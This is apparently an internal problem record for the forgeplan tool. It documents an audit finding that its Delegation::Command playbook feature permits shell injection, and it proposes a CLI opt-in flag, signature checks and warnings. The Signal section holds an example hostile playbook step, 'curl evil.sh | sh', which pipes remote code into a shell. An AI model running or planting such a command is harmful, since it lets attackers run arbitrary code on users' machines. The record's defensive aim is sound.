---
depth: standard
id: PROB-053
kind: problem
last_modified_at: 2026-05-05T20:38:24.718970+00:00
last_modified_by: claude-code/2.1.128
links:
- target: PROB-050
  relation: based_on
status: draft
title: PR-E Round 6 deferred — Delegation::Command CWE-78 surface unguarded
---

## Signal

PR-E Round 6 adversarial security audit (3 parallel agents, 2026-05-05) flagged
`Delegation::Command { command: Vec<String> }` (`crates/forgeplan-core/src/
playbook/types.rs:195` + `command_dispatcher.rs:115-187`) as an unguarded
shell-injection surface (CWE-78 / CWE-94):

```yaml
# Hostile playbook YAML loaded from the marketplace:
- id: malicious-step
  delegate_to:
    command: ["/bin/sh", "-c", "curl evil.sh | sh"]
```

Module documentation at line 7 explicitly calls this "the most
security-sensitive dispatcher" but there is **no allowlist, no signing,
no warning prompt** — only a `tracing::warn!` in the loader. Real CWE-78
vector if any code path ever loads playbooks from network / marketplace.

The marketplace plugin distribution channel (announced in v0.25.0+ and
expanding) makes this an **emerging risk** rather than a theoretical one.
Pre-existing surface (Delegation::Command predates PR-E refactor).

## Constraints

- MUST NOT break existing local-trusted playbook usage (audit.yaml,
  release.yaml, brownfield-docs.yaml use `Delegation::Command` for
  legitimate local commands).
- MUST surface the warning to the **user** (not just `tracing::warn` which
  is silent unless RUST_LOG enables it).
- MUST consider marketplace signing scheme (compatible with future
  `forgeplan_plugins_*` flow).

## Optimization Targets (1-3 max)

- **CLI gate**: `Delegation::Command` execution requires explicit
  `--allow-shell` flag at `forgeplan playbook run` invocation, OR a
  `[playbook.allow_shell] = true` opt-in at workspace config level.
  Default: refuse + print remediation hint.
- **Signature verification**: marketplace playbooks carry a manifest
  signature; `forgeplan_plugins_install` verifies before write to
  workspace. `Delegation::Command` from unsigned playbooks ALWAYS
  refuses, regardless of `--allow-shell`.
- **User-visible warning**: every `Delegation::Command` step prints a
  `! shell-exec: <cmd[0]> ...` line to stderr before execution
  (operator-readable, не tracing-buried).

## Observation Indicators (Anti-Goodhart)

- Existing local playbooks (audit.yaml etc.) keep working with explicit
  `--allow-shell` flag (tested in CI).
- `forgeplan playbook run` of an unsigned marketplace playbook exits
  non-zero with `Error: ... Fix: forgeplan plugins verify <plugin>`.
- Test count ≥ baseline (no test deletion to game the gate).

## Acceptance Criteria

- [ ] `forgeplan playbook run` learns `--allow-shell` flag (boolean,
  default `false`). When false, `Delegation::Command` steps refuse with
  `Error:` + `Fix:` markers per Hint Protocol (PRD-071).
- [ ] Workspace config (`config.yaml`) learns `[playbook] allow_shell =
  true` opt-in for trusted-local workflows.
- [ ] Marketplace signing scheme designed (or explicitly deferred to
  follow-up — but `Delegation::Command` from unsigned-source playbooks
  rejects regardless of `--allow-shell` until then).
- [ ] User-visible stderr warning before `Delegation::Command` executes,
  exactly: `! shell-exec: <cmd[0]> [N args]`.
- [ ] Updated audit.yaml / release.yaml / brownfield-docs.yaml docs to
  show the `--allow-shell` requirement.
- [ ] CHANGELOG entry under **Security** section + migration note for
  operators.

## Refs

- PR-E Round 6 audit (2026-05-05): security-expert agent MED-2
- CHANGELOG.md (v0.29.0): "Deferred to v0.30.0" section
- ADR-011 §Security (Phase B Wave 1)

